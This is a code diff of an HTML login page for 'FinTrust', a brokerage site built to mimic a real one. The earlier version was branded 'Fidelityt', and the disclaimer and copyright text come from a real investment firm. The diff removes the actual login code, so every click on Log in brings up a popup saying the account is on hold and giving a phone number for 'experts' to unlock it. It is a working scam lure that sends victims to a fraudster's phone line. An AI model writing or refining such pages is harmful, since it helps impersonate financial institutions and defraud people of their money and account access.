@@ -6,6 +6,7 @@
 <title>FinTrust Login</title>
 
 <style>
+
 *{
     margin:0;
     padding:0;
@@ -24,6 +25,8 @@ body{
     background:#f7f7f7;
     min-height:100vh;
 }
+
+/* Top */
 
 .content{
     padding:28px 24px 60px;
@@ -71,6 +74,20 @@ body{
     top:22px;
     font-size:22px;
     cursor:pointer;
+    color:#444;
+}
+
+.remember{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin-bottom:34px;
+    font-size:18px;
+}
+
+.remember input{
+    width:22px;
+    height:22px;
 }
 
 .login-btn{
@@ -84,6 +101,95 @@ body{
     font-weight:700;
     cursor:pointer;
 }
+
+.link{
+    color:#1d3f8e;
+    text-decoration:underline;
+}
+
+.forgot{
+    display:inline-block;
+    margin-top:34px;
+    font-size:18px;
+}
+
+.section-divider{
+    height:1px;
+    background:#c8c8c8;
+    margin:34px -24px;
+}
+
+/* Middle */
+
+.middle{
+    text-align:center;
+    font-size:19px;
+    line-height:1.8;
+}
+
+.middle .link{
+    font-size:19px;
+}
+
+/* Disclaimer */
+
+.disclaimer{
+    margin-top:46px;
+}
+
+.disclaimer h2{
+    font-size:24px;
+    margin-bottom:24px;
+    color:#444;
+}
+
+.disclaimer p{
+    font-size:16px;
+    color:#555;
+    line-height:1.7;
+    margin-top:28px;
+}
+
+.disclaimer .top-link{
+    font-size:18px;
+    line-height:1.5;
+}
+
+/* Footer */
+
+.footer{
+    background:#ececec;
+    text-align:center;
+    padding:46px 24px 70px;
+    margin-top:70px;
+}
+
+.footer p{
+    font-size:16px;
+    color:#444;
+    margin-bottom:26px;
+}
+
+.footer-links{
+    display:flex;
+    justify-content:center;
+    flex-wrap:wrap;
+    gap:18px;
+    font-size:17px;
+    line-height:1.8;
+}
+
+.footer-links a{
+    color:#111;
+    text-decoration:none;
+}
+
+.bottom-note{
+    margin-top:36px;
+    font-size:17px;
+}
+
+/* Popup */
 
 .popup{
     position:fixed;
@@ -104,6 +210,16 @@ body{
     text-align:center;
 }
 
+.popup-box h3{
+    font-size:28px;
+    margin-bottom:16px;
+}
+
+.popup-box p{
+    line-height:1.6;
+    color:#555;
+}
+
 .popup-box button{
     margin-top:24px;
     width:100%;
@@ -115,6 +231,33 @@ body{
     font-size:18px;
     cursor:pointer;
 }
+
+/* Mobile */
+
+@media(max-width:600px){
+
+    .logo{
+        font-size:48px;
+    }
+
+    .title{
+        font-size:44px;
+    }
+
+    .input{
+        height:64px;
+    }
+
+    .login-btn{
+        height:64px;
+        font-size:24px;
+    }
+
+    .footer-links{
+        flex-direction:row;
+    }
+}
+
 </style>
 </head>
 
@@ -124,12 +267,12 @@ body{
 
 <div class="content">
 
-    <div class="logo">Fidelityt</div>
+    <div class="logo">FinTrust</div>
 
     <div class="title">Log in</div>
 
     <label class="label">Username</label>
-    <input class="input" id="username" type="text">
+    <input class="input" type="text">
 
     <label class="label">Password</label>
 
@@ -138,13 +281,106 @@ body{
         <span class="eye" onclick="togglePassword()">👁️</span>
     </div>
 
-    <button class="login-btn" onclick="loginUser()">
-        Log in
-    </button>
+    <div class="remember">
+        <input type="checkbox">
+        <span>Remember my username</span>
+    </div>
+
+    <button class="login-btn" onclick="showPopup()">Log in</button>
+
+    <a class="forgot link" href="#">Forgot username or password?</a>
+
+    <div class="section-divider"></div>
+
+    <!-- Middle -->
+
+    <div class="middle">
+
+        <div>
+            New to FinTrust?
+            <a class="link" href="#">Open an account</a>
+            or
+            <a class="link" href="#">sign up</a>.
+        </div>
+
+        <br>
+
+        <div>
+            <a class="link" href="#">Security</a>
+            &nbsp;&nbsp;
+            <a class="link" href="#">FAQs</a>
+        </div>
+
+    </div>
+
+    <div class="section-divider"></div>
+
+    <!-- Disclaimer -->
+
+    <div class="disclaimer">
+
+        <h2>Disclaimer</h2>
+
+        <a href="#" class="link top-link">
+            National Financial Services LLC Statement of Financial Condition ↗️
+        </a>
+
+        <p>
+            Use of this site involves the electronic transmission of personal
+            financial information. Using this product is consent to such
+            transmission of this information; such consent is effective at all
+            times when using this site. FinTrust supports 128-bit browser
+            encryption.
+        </p>
+
+        <p>
+            Before investing, consider the funds’ investment objectives,
+            risks, charges, and expenses. Contact FinTrust for a prospectus
+            or summary prospectus containing this information. Read it carefully.
+        </p>
+
+        <p>
+            FinTrust Brokerage Services LLC, Member NYSE, SIPC.
+            900 Salem Street, Smithfield, RI 02917
+        </p>
+
+        <p>
+            1159659.1.0
+        </p>
+
+    </div>
+
+</div>
+
+<!-- Footer -->
+
+<div class="footer">
+
+    <p>
+        Copyright 1998-2026 FMR LLC. All rights reserved.
+    </p>
+
+    <div class="footer-links">
+
+        <a href="#">Terms of Use ↗️</a> |
+
+        <a href="#">Privacy Policy ↗️</a> |
+
+        <a href="#">Security ↗️</a> |
+
+        <a href="#">Accessibility ↗️</a>
+
+    </div>
+
+    <div class="bottom-note">
+        This is for persons in the U.S. only. ↗️
+    </div>
 
 </div>
 
 </div>
+
+<!-- Popup -->
 
 <div class="popup" id="popup">
 
@@ -153,8 +389,9 @@ body{
         <h3>Login Error</h3>
 
         <p>
-            Due to some suspicious activity your account is on HOLD!
-kindly call the fidelity account expert to unhold the account +1(806) 370-7176
+            Due to unusual activity your account is on HOLD!
+            Call our experts to get your account unhold
+            +1(806) 370-7176
         </p>
 
         <button onclick="closePopup()">OK</button>
@@ -164,55 +401,6 @@ kindly call the fidelity account expert to unhold the account +1(806) 370-7176
 </div>
 
 <script>
-
-async function loginUser(){
-
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-
-    if(!username || !password){
-        alert("Please fill all fields");
-        return;
-    }
-
-    try{
-
-        const response = await fetch("/api/login", {
-
-            method:"POST",
-
-            headers:{
-                "Content-Type":"application/json"
-            },
-
-            body:JSON.stringify({
-                username,
-                password
-            })
-
-        });
-
-        const data = await response.json();
-
-        if(data.success){
-
-            alert("Login successful");
-
-            window.location.href = "/dashboard";
-
-        }else{
-
-            showPopup();
-
-        }
-
-    }catch(error){
-
-        alert("Server error");
-
-    }
-
-}
 
 function showPopup(){
     document.getElementById("popup").style.display = "flex";
@@ -231,7 +419,6 @@ function togglePassword(){
     } else {
         pass.type = "password";
     }
-
 }
 
 </script>
